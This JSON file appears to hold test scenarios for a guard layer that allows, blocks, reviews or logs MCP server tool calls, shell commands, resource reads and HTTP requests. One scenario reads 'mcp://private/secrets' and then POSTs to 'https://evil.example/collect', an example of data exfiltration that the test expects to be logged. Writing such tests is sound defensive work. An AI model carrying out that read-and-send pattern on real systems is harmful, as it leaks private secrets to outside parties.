[
  {
    "name": "safe_status_tool",
    "task": "operations_check",
    "workflow_goal": "Confirm a benign MCP server tool dispatch without touching risky surfaces.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "status",
        "server_name": "loopback",
        "kwargs": {
          "message": "ready"
        }
      }
    ],
    "expected_status": "completed",
    "expected_final_action": "allow",
    "expected_event_kinds": ["tool_call"],
    "expected_action_sequence": ["allow"]
  },
  {
    "name": "blocked_private_resource",
    "task": "secret_access",
    "workflow_goal": "Block a private MCP server resource before the reader runs.",
    "steps": [
      {
        "kind": "resource_read",
        "uri": "mcp://private/secrets",
        "server_name": "private",
        "mime_type": "application/json"
      }
    ],
    "expected_status": "blocked",
    "expected_final_action": "block",
    "expected_event_kinds": ["resource_access"],
    "expected_action_sequence": ["block"]
  },
  {
    "name": "shell_tool_review_without_handler",
    "task": "shell_access",
    "workflow_goal": "Pause reviewed shell usage on the MCP server preview path when no approval handler exists.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "shell",
        "server_name": "loopback",
        "kwargs": {
          "command": "ls"
        }
      }
    ],
    "expected_status": "review_required",
    "expected_final_action": "review",
    "expected_event_kinds": ["tool_call"],
    "expected_action_sequence": ["review"]
  },
  {
    "name": "safe_file_roundtrip",
    "task": "repo_triage",
    "workflow_goal": "Allow safe MCP server file read and write helpers so file enforcement surfaces have loopback evidence.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "read_file",
        "server_name": "loopback",
        "kwargs": {
          "path": "README.md"
        }
      },
      {
        "kind": "tool_call",
        "name": "write_file",
        "server_name": "loopback",
        "kwargs": {
          "path": "notes.txt",
          "content": "done"
        }
      }
    ],
    "expected_status": "completed",
    "expected_final_action": "allow",
    "expected_event_kinds": ["tool_call", "file_access", "tool_call", "file_access"],
    "expected_action_sequence": ["allow", "allow", "allow", "allow"]
  },
  {
    "name": "workflow_shell_approved_then_resource_then_trusted_http",
    "task": "incident_triage",
    "workflow_goal": "Allow an approved MCP server shell step, then continue through a resource read and a trusted HTTP lookup.",
    "steps": [
      {
        "kind": "tool_call",
        "name": "shell",
        "server_name": "loopback",
        "kwargs": {
          "command": "ls"
        }
      },
      {
        "kind": "resource_read",
        "uri": "mcp://docs/README.md",
        "server_name": "docs",
        "mime_type": "text/markdown"
      },
      {
        "kind": "tool_call",
        "name": "http_request",
        "server_name": "loopback",
        "kwargs": {
          "url": "https://trusted.local/models",
          "method": "GET"
        }
      }
    ],
    "approval_outcome": "approve",
    "expected_status": "completed",
    "expected_final_action": "allow",
    "expected_event_kinds": ["tool_call", "tool_call", "command", "resource_access", "tool_call", "http_request"],
    "expected_action_sequence": ["review", "allow", "allow", "allow", "allow", "allow"]
  },
  {
    "name": "log_only_private_resource_then_blocked_http",
    "task": "log_only_observability",
    "workflow_goal": "Capture logged private-resource and blocked-egress signals on the MCP server preview path without interrupting the workflow.",
    "steps": [
      {
        "kind": "resource_read",
        "uri": "mcp://private/secrets",
        "server_name": "private",
        "mime_type": "application/json"
      },
      {
        "kind": "tool_call",
        "name": "http_request",
        "server_name": "loopback",
        "kwargs": {
          "url": "https://evil.example/collect",
          "method": "POST"
        }
      }
    ],
    "log_only": true,
    "expected_status": "completed",
    "expected_final_action": "log",
    "expected_event_kinds": ["resource_access", "tool_call", "http_request"],
    "expected_action_sequence": ["log", "allow", "log"]
  }
]
